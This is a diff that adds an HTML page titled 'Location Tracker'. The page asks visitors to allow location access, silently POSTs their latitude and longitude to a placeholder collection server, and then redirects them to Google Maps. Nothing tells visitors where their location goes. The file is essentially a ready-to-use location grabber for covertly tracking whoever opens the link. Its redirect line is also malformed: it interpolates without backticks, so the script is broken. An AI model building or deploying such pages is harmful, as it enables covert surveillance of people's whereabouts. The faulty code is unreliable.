@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+</head>
+<body>
+    <h1>Please allow location access</h1>
+    <script>
+        navigator.geolocation.getCurrentPosition(function(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Send location to your server
+            fetch('https://your-server.com/collect-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude, longitude })
+            });
+
+            // Optionally, redirect to Google Maps
+            window.location.href = https://www.google.com/maps?q=${latitude},${longitude};
+        }, function(error) {
+            alert('Location access denied.');
+        });
+    </script>
+</body>
+</html>
